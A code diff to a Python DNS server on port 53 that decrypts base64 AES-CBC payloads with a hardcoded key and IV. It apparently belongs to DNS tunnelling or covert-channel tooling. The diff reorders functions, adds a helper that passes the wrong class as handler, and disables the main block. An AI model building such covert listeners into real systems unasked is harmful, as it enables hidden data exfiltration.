@@ -15,12 +15,6 @@ PORT = 53
 KEY = b'267eAs?594f6C:5m'
 IV = b'a5E8s9!AF272344_'
 
-def decrypt_aes_cbc(key, iv, ciphertext):
-    cipher = AES.new(key, AES.MODE_CBC, iv)
-    decrypted_data = cipher.decrypt(base64.b64decode(ciphertext))
-    
-    return unpad(decrypted_data, AES.block_size).decode()
-
 class CustomResolver(BaseResolver):
     def resolve(self, request, handler):
         qname = request.q.qname
@@ -81,8 +75,22 @@ class CustomDNSHandler(DNSHandler):
 
         socket.sendto(reply.pack(), self.client_address)
 
+def decrypt_aes_cbc(key, iv, ciphertext):
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    decrypted_data = cipher.decrypt(base64.b64decode(ciphertext))
+    
+    return unpad(decrypted_data, AES.block_size).decode()
+
+def dns_server(dns_port):
+    resolver = CustomResolver()
+    server = DNSServer(resolver, port=dns_port, handler=CustomResolver)
+
+    server.start()
+    print(f"[*] Listening to {HOST}:{PORT}...")
+"""
 if __name__ == "__main__":
     resolver = CustomResolver()
     server = DNSServer(resolver, port=PORT, handler=CustomDNSHandler)
 
     server.start()
+"""
